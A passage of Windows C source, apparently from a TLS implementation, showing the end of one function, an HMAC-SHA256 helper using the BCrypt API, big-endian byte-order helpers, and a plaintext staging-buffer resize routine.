    ok      = TRUE;

cleanup:
    if (hKey) BCryptDestroyKey(hKey);
    if (hAlg) BCryptCloseAlgorithmProvider(hAlg, 0);
    return ok;
}


/* ─────────────────────────────────────────────────────────────────────────── */
/*  HMAC-SHA256 via BCrypt                                                     */
/* ─────────────────────────────────────────────────────────────────────────── */

static BOOL _hmac_sha256(const BYTE *pKey, DWORD cbKey,
                          const BYTE *pMsg, DWORD cbMsg,
                          BYTE *pOut)
{
    BCRYPT_ALG_HANDLE hAlg  = NULL;
    BCRYPT_HASH_HANDLE hHash = NULL;
    BOOL ok = FALSE;

    if (!BCRYPT_SUCCESS(BCryptOpenAlgorithmProvider(&hAlg,
                         BCRYPT_SHA256_ALGORITHM, NULL,
                         BCRYPT_ALG_HANDLE_HMAC_FLAG)))
        goto cleanup;

    if (!BCRYPT_SUCCESS(BCryptCreateHash(hAlg, &hHash,
                         NULL, 0, (PUCHAR)pKey, cbKey, 0)))
        goto cleanup;

    if (!BCRYPT_SUCCESS(BCryptHashData(hHash, (PUCHAR)pMsg, cbMsg, 0)))
        goto cleanup;

    if (!BCRYPT_SUCCESS(BCryptFinishHash(hHash, pOut, TLS_AUTH_HMAC_LEN, 0)))
        goto cleanup;

    ok = TRUE;

cleanup:
    if (hHash) BCryptDestroyHash(hHash);
    if (hAlg)  BCryptCloseAlgorithmProvider(hAlg, 0);
    return ok;
}


/* ─────────────────────────────────────────────────────────────────────────── */
/*  Byte-order helpers                                                         */
/* ─────────────────────────────────────────────────────────────────────────── */

static void _write_be32(BYTE *p, uint32_t v)
{
    p[0] = (BYTE)(v >> 24);
    p[1] = (BYTE)(v >> 16);
    p[2] = (BYTE)(v >>  8);
    p[3] = (BYTE)(v);
}

static void _write_be64(BYTE *p, uint64_t v)
{
    p[0] = (BYTE)(v >> 56); p[1] = (BYTE)(v >> 48);
    p[2] = (BYTE)(v >> 40); p[3] = (BYTE)(v >> 32);
    p[4] = (BYTE)(v >> 24); p[5] = (BYTE)(v >> 16);
    p[6] = (BYTE)(v >>  8); p[7] = (BYTE)(v);
}

static uint32_t _read_be32(const BYTE *p)
{
    return ((uint32_t)p[0] << 24) | ((uint32_t)p[1] << 16)
         | ((uint32_t)p[2] <<  8) |  (uint32_t)p[3];
}

static uint64_t _read_be64(const BYTE *p)
{
    return ((uint64_t)p[0] << 56) | ((uint64_t)p[1] << 48)
         | ((uint64_t)p[2] << 40) | ((uint64_t)p[3] << 32)
         | ((uint64_t)p[4] << 24) | ((uint64_t)p[5] << 16)
         | ((uint64_t)p[6] <<  8) |  (uint64_t)p[7];
}


/* ─────────────────────────────────────────────────────────────────────────── */
/*  Plaintext staging buffer helpers                                           */
/* ─────────────────────────────────────────────────────────────────────────── */

static BOOL _plain_buf_ensure(PTLS_CONTEXT pCtx, DWORD cbNeed)
{
    if (pCtx->cbPlainBufAlloc >= cbNeed) return TRUE;
    DWORD cbNew = pCtx->cbPlainBufAlloc * 2;
    if (cbNew < cbNeed) cbNew = cbNeed;
    BYTE *p = (BYTE *)realloc(pCtx->pPlainBuf, cbNew);
    if (!p) return FALSE;
    pCtx->pPlainBuf       = p;
    pCtx->cbPlainBufAlloc = cbNew;
    return TRUE;
}
